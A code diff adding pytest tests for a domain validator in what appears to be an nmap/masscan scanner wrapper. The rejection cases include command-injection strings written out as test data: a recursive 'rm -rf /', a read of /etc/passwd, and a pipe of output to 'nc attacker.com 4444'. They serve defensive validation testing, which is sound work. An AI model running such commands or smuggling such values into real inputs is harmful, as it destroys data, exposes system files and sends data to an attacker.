@@ -5,7 +5,7 @@ import pytest
 
 from app.scanner.masscan_wrapper import run_masscan
 from app.scanner.nmap_wrapper import _scan_port_spec, run_nmap
-from app.scanner.validator import validate_target
+from app.scanner.validator import validate_domain, validate_target
 
 
 @pytest.mark.parametrize(
@@ -69,6 +69,48 @@ def test_validate_ports_rejects_unsafe_specs(ports: str) -> None:
 
     with pytest.raises(ValueError):
         validate_ports(ports)
+
+
+def test_validate_domain_accepts_valid_fqdns() -> None:
+    assert validate_domain("example.com") == "example.com"
+    assert validate_domain("sub.example.com") == "sub.example.com"
+    assert validate_domain("deep.sub.example.co.uk") == "deep.sub.example.co.uk"
+    assert validate_domain("Example.COM") == "example.com"
+    assert validate_domain("sub.example.com.") == "sub.example.com"
+
+
+@pytest.mark.parametrize(
+    "domain",
+    [
+        "",
+        "   ",
+        "example",
+        "not a domain",
+        "-example.com",
+        "example-.com",
+        ".example.com",
+        "example..com",
+        "example.com; rm -rf /",
+        "example.com && cat /etc/passwd",
+        "example.com | nc attacker.com 4444",
+        "example.com$PATH",
+        "sp ace.example.com",
+    ],
+)
+def test_validate_domain_rejects_invalid_values(domain: str) -> None:
+    with pytest.raises(ValueError):
+        validate_domain(domain)
+
+
+def test_validate_domain_rejects_oversized_value() -> None:
+    with pytest.raises(ValueError, match="too long"):
+        validate_domain(f"{'a' * 60}.com" * 5)
+
+
+def test_validate_domain_rejects_injection_characters() -> None:
+    for char in (";", "|", "&", "$", "`", " "):
+        with pytest.raises(ValueError, match="forbidden"):
+            validate_domain(f"example{char}com")
 
 
 def test_nmap_port_spec_keeps_masscan_ports_and_adds_os_discovery_range() -> None:
